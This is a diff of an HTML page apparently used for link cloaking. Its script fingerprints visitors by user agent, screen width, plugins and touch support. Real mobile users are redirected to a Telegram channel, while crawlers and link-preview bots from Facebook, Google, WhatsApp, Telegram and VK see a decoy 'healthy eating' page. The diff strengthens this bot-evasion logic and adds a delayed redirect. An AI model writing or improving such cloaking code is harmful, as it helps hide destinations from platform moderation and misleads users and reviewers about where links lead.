@@ -1,18 +1,25 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Загрузка...</title>
   <script>
     const isRealUser = () => {
       const ua = navigator.userAgent.toLowerCase();
-      const isMobile = /android|iphone|ipad|ipod|mobile/.test(ua);
-      const isBot = /bot|facebook|crawler|preview|google|whatsapp|vk|telegram/.test(ua);
-      return isMobile && !isBot;
+      const widthCheck = screen.width > 320;
+      const pluginsCheck = navigator.plugins.length > 0;
+      const notBot = !/bot|crawl|spider|facebook|preview|google|whatsapp|telegram|vk/.test(ua);
+      const isMobile = /android|iphone|ipad|ipod|mobile/i.test(ua);
+      const hasTouch = 'ontouchstart' in window;
+
+      return widthCheck && pluginsCheck && isMobile && notBot && hasTouch;
     };
 
     if (isRealUser()) {
-      location.href = "https://t.me/paradise_opt";
+      setTimeout(() => {
+        window.location.replace("https://t.me/paradise_opt");
+      }, 300);
     } else {
       document.write(`
         <h1>Здоровое питание</h1>
@@ -26,4 +33,3 @@
 </head>
 <body></body>
 </html>
-
